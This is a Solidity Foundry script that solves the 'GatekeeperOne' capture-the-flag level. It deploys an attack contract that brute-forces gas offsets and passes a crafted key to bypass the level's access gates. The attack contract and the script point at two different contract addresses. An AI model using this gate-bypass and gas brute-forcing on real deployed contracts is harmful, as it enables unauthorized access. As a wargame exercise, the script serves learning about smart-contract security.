// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level13.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackCont {
    GatekeeperOne public gatekeeperOne =
        GatekeeperOne(0xa6c517883A504b57A4845A44209F8dF9F17Cba54);
    uint256 public lastSuccessfulAttempt;

    function gogo() external {
        uint256 i = 0;
        while (true) {
            // bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0x000000FF0000FFFF;
            (bool success, ) = address(gatekeeperOne).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature(
                    "enter(bytes8)",
                    bytes8(0xCCCCCCCC000007e1)
                )
            );
            if (success) {
                break;
            }
            lastSuccessfulAttempt++;
            i++;
        }
    }
}

contract GatekeeperOneSolution is Script {
    GatekeeperOne public gatekeeperOne =
        GatekeeperOne(0xeab290f672E24C4e462e961DB9fd1f87F04Da2f6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackCont attackCont = new AttackCont();
        console.log("entrant", gatekeeperOne.entrant());
        attackCont.gogo();
        console.log("entrant", gatekeeperOne.entrant());
        vm.stopBroadcast();
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        bytes32 data = bytes32(value);
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(2 + 64);
        str[0] = "0";
        str[1] = "x";
        for (uint256 i = 0; i < 32; i++) {
            str[2 + i * 2] = alphabet[uint8(data[i] >> 4) & 0xf];
            str[3 + i * 2] = alphabet[uint8(data[i]) & 0xf];
        }
        return string(str);
    }
}
